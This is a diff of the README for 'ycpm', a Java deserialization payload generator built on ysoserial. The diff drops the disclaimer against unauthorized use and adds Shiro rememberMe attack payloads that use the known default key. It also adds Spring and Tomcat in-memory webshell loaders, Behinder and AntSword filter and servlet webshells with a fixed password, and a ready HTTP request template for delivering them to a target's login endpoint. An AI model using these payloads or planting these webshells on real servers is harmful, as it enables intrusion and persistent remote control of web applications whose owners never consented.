@@ -1,83 +1,105 @@
 # 🌐 ycpm - Ysoserial Chain Process Model
 
-**ycpm** 是一个用于构建和处理 Java 反序列化利用链的工具，支持动态编码、多级编排。  
-它基于 [ysoserial](https://github.com/frohoff/ysoserial) 构建，本项目仅用于 Java 安全研究与学习目的，旨在帮助安全研究人员、开发者简单构建安全测试用的反序列化payload。
+**ycpm** 是一个用于构建和处理 Java 反序列化利用链的工具，支持动态编码、多级编排、反序列化内存马注入。  
 
-请勿将本项目中的任何代码或技术用于未授权的测试、攻击、渗透等任何非法用途。
+该项目基于 [ysoserial](https://github.com/frohoff/ysoserial) 构建，它的主要功能是生成反序列化payload而不是直接攻击目标，所以并不适合红队人员或渗透测试人员。 它更适合在学习Java安全过程中快速生成你想要的反序列化payload。
+
+有了编码器的加持，能够在不借助其他工具的情况下快速完成payload生成。
 
 ---
 
 ## ✨ 功能特性
 
-- ✅ 兼容 ysoserial 的 payload 构造逻辑
-- 🔗 支持 encoder 链：base64、bcel、shiro 等组合
+- ✅ ysoserial payload
+- ✅ encoder：base64、bcel、shiro
+- ✅ 内存马loader：spring、tomcat
+- ✅ 内存马shellcode：冰蝎[filter、servlet]、蚁剑[filter、servlet]
 
 ---
 
 ## 🚀 使用示例
 
-### 1️⃣ 标准 ysoserial 利用链
+### 1️⃣ 使用编码器
+
+在ysoserial的基础上使用base64编码器
 
 ```bash
-java -jar ycpm.jar "CommonsBeanutils1" "calc"
+java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "base64->print"
 ```
-等价于：java -jar ysoserial.jar "CommonsBeanutils1" "calc"
 
-### 2️⃣ 构造并进行链式编码
+生成攻击shiro的payload（在反序列化链的基础上使用shiro格式编码器并指定密钥）
 
 ```bash
-# 在标准ysoserial的基础上使用base64编码并通过终端输出
-java -jar ycpm.jar "CommonsBeanutils1" "calc" "base64->print"
+java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro:kPH+bIxk5D2deZiIxcaaaA==->print"
+```
 
-# 使用base64编码并输出到exploit.ser文件
-java -jar ycpm.jar "CommonsBeanutils1" "calc" "base64->file:exploit.ser"
 
-# 使用shiro encoder并指定加密用的key，将结果通过终端输出
-java -jar ycpm.jar "CommonsBeanutils1" "calc" "shiro:kPH+bIxk5D2deZiIxcaaaA==->print"
+### 2️⃣ 生成Loader类型的内存马（shiro）
 
-# 使用shiro encoder，使用默认key(kPH+bIxk5D2deZiIxcaaaA==)，并将结果进行url编码输出到终端
-java -jar ycpm.jar "CommonsBeanutils1" "calc" "shiro->url->print"
+生成攻击shiro类型的loader
 
-# 在此基础上你还可以多次调用编码器，就像这样：
-java -jar ycpm.jar "CommonsBeanutils1" "calc" "shiro->url->url->print"
+```bash
+java -jar ycpm.jar "CommonsBeanutils1" "spring-loader:classdata" "shiro->print"
+```
+
+生成冰蝎类型内存马
+
+```bash
+java -jar ycpm.jar "MemShell" "bx-filter:Hello:/*:passwd" "base64->url->print"
+```
+
+构造HTTP包发送payload
+
+```http request
+POST /doLogin HTTP/1.1
+Host: 192.168.137.132:8080
+Cache-Control: max-age=0
+Origin: your-ip:8080
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.137.132:8080/login;jsessionid=3F5E92A171B707DD38283016EEFF5CB1
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Cookie: rememberMe=[反序列化 shiro loader]
+Connection: keep-alive
+
+classdata=[反序列化 base64->url 内存马]
 ```
 
 ## 🧩 Encoder 编码器
 
-本模块实现了一个 **可插拔、可链式组合的编码器框架**，支持多种常见编码方式，适用于反序列化、加密流构造、Payload 编码等场景。各个编码器均支持通过注解注册及自动扫描方式进行加载，可自由组合调用，形成链式调用流程。
+一个支持链式指定调用的编码器。
 
 如果链条的末尾未使用`file`、`print`的话，则会默认在链条的结尾调用`print`
 
-### ✅ 当前支持的编码器列表
+### 当前支持的编码器列表
 
-| 编码器名称 | 描述                                                | 输入类型                           | 输出类型         | 示例                                       |
-|------------|---------------------------------------------------|--------------------------------|--------------|------------------------------------------|
-| `base64`   | 标准 Base64 编码                                      | `Object` / `byte[]` / `String` | `String`     | `base64`                                 
-| `shiro`    | Shiro AES 加密 + Base64 编码（用于构造 rememberMe payload） | `Object` / `byte[]`            | `String`     | `shiro`、`shiro:kPH+bIxk5D2deZiIxcaaaA==` |
-| `BCEL`     | BCEL 编码器，用于将类字节码转为 `$$BCEL$$` 编码格式                | `Object` / `byte[]`                       | `String`     | `bcel`                                   |
-| `URL`      | URL 编码                                            | `String`                       | `String`     | `url`                                    |
-| `File`     | 将内容输出到文件                                          | `String`（文件路径）                 | `Boolean`    | `file`、`file:exploit.ser`                |
-| `Print`    | 默认使用System.out输出内容                                | 任意                             | `System.out` | `print`                                  |
+| 编码器名称 | 描述             | 示例                                       |
+|------------|----------------|------------------------------------------|
+| `base64`   | `Base64`格式转换   | `base64`                                 
+| `shiro`    | `AES`+`Base64`格式转换 | `shiro`、`shiro:kPH+bIxk5D2deZiIxcaaaA==` |
+| `BCEL`     | `$$BCEL$$`格式转换 | `bcel`                                   |
+| `URL`      | `URL`          | `url`                                    |
+| `File`     | 结果输出到文件        | `file`、`file:exploit.ser`                |
+| `Print`    | 结果输出到终端        | `print`                                  |
 
-> 💡 编码器均支持链式组合，例如：Chain -> BCEL 编码 -> Base64 编码。
+## 🧩 内存马加载器(Loader)
 
-### 🔗 编码器链式调用示例
+| 内存马加载器          | 描述                                                | 示例                        |
+|-----------------|---------------------------------------------------|---------------------------|
+| `spring-loader` | Spring环境下从HTTP body中加载一个classdata参数作为内存马shellcode | `spring-loader:classdata` 
+| `tomcat-loader` | Tomcat环境下从HTTP body中加载一个classdata参数作为内存马shellcode | `tomcat-loader:classdata` |
 
-```bash
-# 生成shiro的默认密钥攻击payload，并打印在终端，下边这两条命令是相等的
-java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro"
-java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro->print"
+## 🧩 内存马(shellcode)
 
-# 生成shiro指定密钥攻击payload，并打印在终端，下边这两条命令是相等的
-java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro:kPH+bIxk5D2deZiIxcaaaA=="
-java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro:kPH+bIxk5D2deZiIxcaaaA==->print"
-
-# 生成shiro指定密钥攻击payload，并将结果输出到exploit.ser文件
-java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro->file:exploit.ser"
-
-# 在此基础上你还可以多次调用编码器，就像这样：
-java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro:kPH+bIxk5D2deZiIxcaaaA==->url->print"
-```
+| 内存马类型                            | 描述                                   | 示例                        |
+|----------------------------------|--------------------------------------|---------------------------|
+| `bx-filter`                      | 冰蝎Filter内存马：拦截路径为/*、密码为`passwd`      | `bx-filter:Hello:/*:passwd` 
+| `bx-servlet`                     | 冰蝎Servlet内存马：拦截路径为/shell、密码为`passwd` | `bx-servlet:Hello:/shell:passwd` |
+| `yj-filter`                      | 蚁剑Filter内存马：拦截路径为/*、密码为`passwd`      | `yj-filter:Hello:/*:passwd` |
+| `yj-servlet`                     | 蚁剑Servlet内存马：拦截路径为/shell、密码为`passwd` | `yj-servlet:Hello:/shell:passwd` |
 
 ## 🙏 致谢
 
